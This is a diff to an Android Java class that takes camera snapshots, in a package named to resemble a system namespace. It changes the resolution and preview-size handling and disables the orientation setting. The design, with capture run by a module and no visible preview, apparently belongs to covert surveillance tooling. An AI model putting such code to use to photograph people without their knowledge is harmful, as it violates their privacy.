@@ -32,6 +32,7 @@ import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.module.ModuleCamera;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Utils;
 
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
@@ -126,11 +127,15 @@ public class CameraSnapshot {
 	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
 	public void snapshot(int face) {
 		// arbitrary but popular values
-		final int encWidth = 1024;
-		final int encHeight = 768;
+		final int encWidth = 768; //1024;
+		final int encHeight = 432; //768;
+
+		//768x432
 
 		synchronized (cameraLock) {
 			try {
+
+				// disabilitare su Nexus 4 e versione 4.2.2
 
 				Camera mCamera = prepareCamera(face, encWidth, encHeight);
 				if (mCamera == null) {
@@ -185,6 +190,7 @@ public class CameraSnapshot {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (openCamera), found FACE CAMERA");
 				}
+				//continue;
 			}
 			if (requestFace == cameraInfo.facing) {
 				try {
@@ -193,7 +199,8 @@ public class CameraSnapshot {
 						Check.log(TAG + " (openCamera), opened: " + camIdx);
 					}
 					if(cam!=null) {
-						setCameraDisplayOrientation(camIdx, cam);
+						//Utils.sleep(10);
+						//setCameraDisplayOrientation(camIdx, cam);
 						return cam;
 					}
 				} catch (RuntimeException e) {
@@ -260,6 +267,17 @@ public class CameraSnapshot {
 	private static void choosePreviewSize(Camera.Parameters parms, int width, int height) {
 		//Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();
 
+		List<Camera.Size> previews = parms.getSupportedPreviewSizes();
+		for (Camera.Size size : previews) {
+			if (size.width == width && size.height == height) {
+				parms.setPreviewSize(width, height);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (choosePreviewSize), found best preview size!");
+				}
+				return;
+			}
+		}
+
 		Camera.Size best = getBestPreviewSize(parms, width, height);
 		if (best != null) {
 			if (Cfg.DEBUG) {
@@ -268,16 +286,8 @@ public class CameraSnapshot {
 			}
 		}
 
-		List<Camera.Size> previews = parms.getSupportedPreviewSizes();
-		for (Camera.Size size : previews) {
-			if (size.width == width && size.height == height) {
-				parms.setPreviewSize(width, height);
-				return;
-			}
-		}
-
-		Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
 		if (best != null) {
+			Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
 			parms.setPreviewSize(best.width, best.height);
 		}
 	}
@@ -318,7 +328,9 @@ public class CameraSnapshot {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setCameraDisplayOrientation), " + degrees);
 			}
-			camera.setDisplayOrientation(result);
+			if(result != 0) {
+				camera.setDisplayOrientation(result);
+			}
 		}catch(Exception ex){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setCameraDisplayOrientation), ERROR: " + ex);
@@ -334,6 +346,9 @@ public class CameraSnapshot {
 		bestSize = null;
 
 		for(int i = 1; i < sizeList.size(); i++){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getBestPreviewSize), supported size: " + sizeList.get(i).width + " x " +sizeList.get(i).height);
+			}
 			int area = sizeList.get(i).width * sizeList.get(i).height;
 			int areaBest = (bestSize!=null? (bestSize.width * bestSize.height) : 0);
 			if(area > areaBest && area < maxSize){
